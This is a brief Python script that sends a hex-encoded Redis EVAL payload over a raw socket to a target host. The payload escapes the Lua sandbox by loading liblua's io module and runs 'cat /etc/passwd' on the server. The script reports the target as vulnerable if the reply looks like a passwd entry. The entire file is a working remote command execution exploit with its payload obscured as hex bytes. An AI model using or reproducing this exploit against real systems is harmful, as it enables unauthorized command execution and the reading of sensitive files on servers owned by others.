import socket,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def getdomain(url):
	# if '/' in url:
	url = url.replace('http://', '').replace('https://', '')
	url = url + '/'
	url = url.split('/')[0]
	return url
def scan(baseurl):
	domain=getdomain(baseurl)
	ip=domain.split(':')[0]
	port=int(domain.split(':')[1])
	socket.setdefaulttimeout(5)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	payload=b"\x65\x76\x61\x6c\x20\x27\x6c\x6f\x63\x61\x6c\x20\x69\x6f\x5f\x6c\x20\x3d\x20\x70\x61\x63\x6b\x61\x67\x65\x2e\x6c\x6f\x61\x64\x6c\x69\x62\x28\x22\x2f\x75\x73\x72\x2f\x6c\x69\x62\x2f\x78\x38\x36\x5f\x36\x34\x2d\x6c\x69\x6e\x75\x78\x2d\x67\x6e\x75\x2f\x6c\x69\x62\x6c\x75\x61\x35\x2e\x31\x2e\x73\x6f\x2e\x30\x22\x2c\x20\x22\x6c\x75\x61\x6f\x70\x65\x6e\x5f\x69\x6f\x22\x29\x3b\x20\x6c\x6f\x63\x61\x6c\x20\x69\x6f\x20\x3d\x20\x69\x6f\x5f\x6c\x28\x29\x3b\x20\x6c\x6f\x63\x61\x6c\x20\x66\x20\x3d\x20\x69\x6f\x2e\x70\x6f\x70\x65\x6e\x28\x22\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x22\x2c\x20\x22\x72\x22\x29\x3b\x20\x6c\x6f\x63\x61\x6c\x20\x72\x65\x73\x20\x3d\x20\x66\x3a\x72\x65\x61\x64\x28\x22\x2a\x61\x22\x29\x3b\x20\x66\x3a\x63\x6c\x6f\x73\x65\x28\x29\x3b\x20\x72\x65\x74\x75\x72\x6e\x20\x72\x65\x73\x27\x20\x30\x0d\x0a"
	s.send(payload)
	result = s.recv(1024).decode()
	s.close()
	if re.search("(root.*?bash)",result):
		return True
	else:
		return False